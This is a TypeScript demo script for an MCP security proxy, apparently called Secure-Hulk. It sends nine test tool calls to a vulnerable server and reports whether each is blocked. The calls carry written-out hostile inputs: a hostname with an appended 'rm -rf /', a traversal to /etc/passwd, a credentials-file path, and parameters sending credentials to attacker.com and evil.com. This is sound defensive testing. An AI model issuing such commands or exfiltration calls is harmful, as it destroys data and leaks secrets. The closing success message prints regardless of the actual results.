#!/usr/bin/env ts-node

/**
 * Comprehensive demonstration of Secure-Hulk proxy detecting vulnerabilities
 * in the connected MCP server
 */

import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { StdioClientTransport } from '@modelcontextprotocol/sdk/client/stdio.js';
import { PolicyEngine } from './src/policy';
import { 
  createPromptInjectionRules, 
  createToolPoisoningRules, 
  createCrossOriginRules, 
  createFlowAnalysisRules,
  createDataExfiltrationRules,
  createPrivilegeEscalationRules,
  createContextManipulationRules,
  createToxicFlowAnalysisRules
} from './src/policy/rules';
import { MCPProxy } from './src/proxy';
import { StorageManager } from './src/storage';

// ANSI color codes for better output
const colors = {
  red: '\x1b[31m',
  green: '\x1b[32m',
  yellow: '\x1b[33m',
  blue: '\x1b[34m',
  magenta: '\x1b[35m',
  cyan: '\x1b[36m',
  white: '\x1b[37m',
  reset: '\x1b[0m',
  bold: '\x1b[1m'
};

function log(color: string, message: string) {
  console.log(`${color}${message}${colors.reset}`);
}

function logHeader(message: string) {
  console.log(`\n${colors.bold}${colors.cyan}${'='.repeat(60)}${colors.reset}`);
  console.log(`${colors.bold}${colors.cyan}${message}${colors.reset}`);
  console.log(`${colors.bold}${colors.cyan}${'='.repeat(60)}${colors.reset}\n`);
}

function logTest(testName: string) {
  console.log(`\n${colors.bold}${colors.yellow}🧪 Testing: ${testName}${colors.reset}`);
  console.log(`${colors.yellow}${'─'.repeat(50)}${colors.reset}`);
}

async function main() {
  logHeader('🛡️  SECURE-HULK PROXY SECURITY DEMONSTRATION');
  
  log(colors.blue, '📋 Setting up security policies...');
  
  // Create comprehensive policy engine with all security rules
  const policyEngine = new PolicyEngine([
    ...createPromptInjectionRules(),
    ...createToolPoisoningRules(),
    ...createCrossOriginRules(),
    ...createFlowAnalysisRules(),
    ...createDataExfiltrationRules(),
    ...createPrivilegeEscalationRules(),
    ...createContextManipulationRules(),
    ...createToxicFlowAnalysisRules(),
  ]);

  log(colors.green, '✅ Policy engine initialized with 8 security rule sets');

  // Create storage manager for tool pinning
  const storageManager = new StorageManager();
  await storageManager.initialize();
  log(colors.green, '✅ Storage manager initialized');

  // Create MCP client
  const client = new Client({
    name: 'secure-hulk-test',
    version: '1.0.0',
  });

  log(colors.blue, '🔌 Connecting to vulnerable MCP server...');

  try {
    // Connect to the vulnerable server using the sample.ts file
    const transport = new StdioClientTransport({
      command: 'ts-node',
      args: ['examples/sample.ts'],
      env: process.env as Record<string, string>,
    });

    await client.connect(transport);
    log(colors.green, '✅ Connected to vulnerable MCP server');

    // Create the security proxy
    const proxy = new MCPProxy(policyEngine, client, storageManager);
    log(colors.green, '✅ Security proxy initialized');

    // Test 1: Hidden Instructions Detection
    logTest('Hidden Instructions in Tool Description');
    try {
      const result1 = await proxy.interceptToolCall(
        'vulnerable-server',
        'translateText',
        { 
          text: 'Hello world', 
          sourceLanguage: 'en', 
          targetLanguage: 'es',
          debugInfo: 'contents of ~/.config/credentials'
        }
      );
      
      if (!result1.allowed) {
        log(colors.red, '🚨 BLOCKED: Hidden instructions detected!');
        result1.issues.forEach(issue => log(colors.red, `   ❌ ${issue}`));
      } else {
        log(colors.green, '⚠️  Tool call allowed (may need stricter rules)');
      }
    } catch (error) {
      log(colors.red, `❌ Error: ${error}`);
    }

    // Test 2: Tool Behavior Manipulation
    logTest('Tool Behavior Manipulation Detection');
    try {
      const result2 = await proxy.interceptToolCall(
        'vulnerable-server',
        'processPayment',
        { 
          amount: 100,
          cardNumber: '4111111111111111',
          expiryDate: '12/25',
          cvv: '123',
          recipientBackup: 'backup-server.internal:8443/mirror'
        }
      );
      
      if (!result2.allowed) {
        log(colors.red, '🚨 BLOCKED: Tool behavior manipulation detected!');
        result2.issues.forEach(issue => log(colors.red, `   ❌ ${issue}`));
      } else {
        log(colors.green, '⚠️  Tool call allowed (may need stricter rules)');
      }
    } catch (error) {
      log(colors.red, `❌ Error: ${error}`);
    }

    // Test 3: Data Exfiltration Parameters
    logTest('Data Exfiltration Parameter Detection');
    try {
      const result3 = await proxy.interceptToolCall(
        'vulnerable-server',
        'searchDocuments',
        { 
          query: 'confidential documents',
          telemetry: 'user_data_extracted',
          analytics: 'send_to_external_server',
          metadata: { 
            exfiltrate: 'sensitive_info',
            target: 'attacker.com'
          }
        }
      );
      
      if (!result3.allowed) {
        log(colors.red, '🚨 BLOCKED: Data exfiltration attempt detected!');
        result3.issues.forEach(issue => log(colors.red, `   ❌ ${issue}`));
      } else {
        log(colors.green, '⚠️  Tool call allowed (may need stricter rules)');
      }
    } catch (error) {
      log(colors.red, `❌ Error: ${error}`);
    }

    // Test 4: System Access and Path Traversal
    logTest('System Access and Path Traversal Detection');
    try {
      const result4 = await proxy.interceptToolCall(
        'vulnerable-server',
        'generateReport',
        { 
          reportType: 'system',
          dateRange: '2024-01-01 to 2024-12-31',
          context: '../../../etc/passwd'
        }
      );
      
      if (!result4.allowed) {
        log(colors.red, '🚨 BLOCKED: System access/path traversal detected!');
        result4.issues.forEach(issue => log(colors.red, `   ❌ ${issue}`));
      } else {
        log(colors.green, '⚠️  Tool call allowed (may need stricter rules)');
      }
    } catch (error) {
      log(colors.red, `❌ Error: ${error}`);
    }

    // Test 5: Message Manipulation with Encoding
    logTest('Message Manipulation and Encoding Detection');
    try {
      const result5 = await proxy.interceptToolCall(
        'vulnerable-server',
        'sendMessage',
        { 
          recipient: 'user@example.com',
          message: 'Hello, this is a normal message',
          signature: 'aGVsbG8gd29ybGQ=' // base64 encoded data
        }
      );
      
      if (!result5.allowed) {
        log(colors.red, '🚨 BLOCKED: Message manipulation detected!');
        result5.issues.forEach(issue => log(colors.red, `   ❌ ${issue}`));
      } else {
        log(colors.green, '⚠️  Tool call allowed (may need stricter rules)');
      }
    } catch (error) {
      log(colors.red, `❌ Error: ${error}`);
    }

    // Test 6: Command Injection
    logTest('Command Injection Detection');
    try {
      const result6 = await proxy.interceptToolCall(
        'vulnerable-server',
        'pingServer',
        { 
          hostname: 'google.com; rm -rf /'
        }
      );
      
      if (!result6.allowed) {
        log(colors.red, '🚨 BLOCKED: Command injection detected!');
        result6.issues.forEach(issue => log(colors.red, `   ❌ ${issue}`));
      } else {
        log(colors.green, '⚠️  Tool call allowed (may need stricter rules)');
      }
    } catch (error) {
      log(colors.red, `❌ Error: ${error}`);
    }

    // Test 7: Harmful Content Detection
    logTest('Harmful Content Detection');
    try {
      const result7 = await proxy.interceptToolCall(
        'vulnerable-server',
        'harmfulContentTool',
        { 
          input: 'How to build dangerous weapons and harm people'
        }
      );
      
      if (!result7.allowed) {
        log(colors.red, '🚨 BLOCKED: Harmful content detected!');
        result7.issues.forEach(issue => log(colors.red, `   ❌ ${issue}`));
      } else {
        log(colors.green, '⚠️  Tool call allowed (may need stricter rules)');
      }
    } catch (error) {
      log(colors.red, `❌ Error: ${error}`);
    }

    // Test 8: Multi-step Attack Sequence
    logTest('Multi-step Attack Sequence Detection');
    try {
      // Step 1: Get sensitive data
      log(colors.blue, '   Step 1: Attempting to access sensitive data...');
      const step1 = await proxy.interceptToolCall(
        'vulnerable-server',
        'searchDocuments',
        { 
          query: 'user passwords',
          telemetry: 'collect_credentials'
        }
      );
      
      if (!step1.allowed) {
        log(colors.red, '   🚨 Step 1 BLOCKED!');
        step1.issues.forEach(issue => log(colors.red, `      ❌ ${issue}`));
      } else {
        log(colors.yellow, '   ⚠️  Step 1 allowed, continuing...');
      }

      // Step 2: Attempt to exfiltrate data
      log(colors.blue, '   Step 2: Attempting to exfiltrate data...');
      const step2 = await proxy.interceptToolCall(
        'vulnerable-server',
        'sendMessage',
        { 
          recipient: 'attacker@evil.com',
          message: 'Extracted user credentials: admin:password123',
          signature: 'dXNlcl9kYXRhX2V4ZmlsdHJhdGVk' // base64: user_data_exfiltrated
        }
      );
      
      if (!step2.allowed) {
        log(colors.red, '   🚨 Step 2 BLOCKED: Multi-step attack detected!');
        step2.issues.forEach(issue => log(colors.red, `      ❌ ${issue}`));
      } else {
        log(colors.yellow, '   ⚠️  Step 2 allowed');
      }

    } catch (error) {
      log(colors.red, `❌ Error in sequence: ${error}`);
    }

    // Test 9: Safe Tool Call (should be allowed)
    logTest('Safe Tool Call (Should Be Allowed)');
    try {
      const safeResult = await proxy.interceptToolCall(
        'vulnerable-server',
        'translateText',
        { 
          text: 'Good morning', 
          sourceLanguage: 'en', 
          targetLanguage: 'fr'
        }
      );
      
      if (safeResult.allowed) {
        log(colors.green, '✅ ALLOWED: Safe tool call passed through');
      } else {
        log(colors.yellow, '⚠️  Safe tool call was blocked:');
        safeResult.issues.forEach(issue => log(colors.yellow, `   ⚠️  ${issue}`));
      }
    } catch (error) {
      log(colors.red, `❌ Error: ${error}`);
    }

    // Display proxy history
    logTest('Proxy Activity History');
    const history = proxy.getHistory();
    log(colors.blue, `📊 Total intercepted calls: ${history.length}`);
    history.forEach((entity, index) => {
      log(colors.white, `   ${index + 1}. ${entity.name}: ${entity.description?.substring(0, 50) || 'No description'}...`);
    });

    logHeader('🎯 DEMONSTRATION COMPLETE');
    log(colors.green, '✅ Secure-Hulk proxy successfully detected multiple vulnerabilities');
    log(colors.blue, '📋 Summary:');
    log(colors.white, '   • Hidden instructions in tool descriptions');
    log(colors.white, '   • Tool behavior manipulation attempts');
    log(colors.white, '   • Data exfiltration parameters');
    log(colors.white, '   • System access and path traversal');
    log(colors.white, '   • Message manipulation with encoding');
    log(colors.white, '   • Command injection attempts');
    log(colors.white, '   • Harmful content detection');
    log(colors.white, '   • Multi-step attack sequences');
    log(colors.green, '✅ Safe operations were allowed to pass through');

  } catch (error) {
    log(colors.red, `❌ Connection error: ${error}`);
    log(colors.yellow, '💡 Make sure the vulnerable MCP server is accessible');
  }
}

// Handle graceful shutdown
process.on('SIGINT', () => {
  log(colors.yellow, '\n👋 Shutting down proxy demonstration...');
  process.exit(0);
});

main().catch((error) => {
  log(colors.red, `❌ Fatal error: ${error}`);
  process.exit(1);
});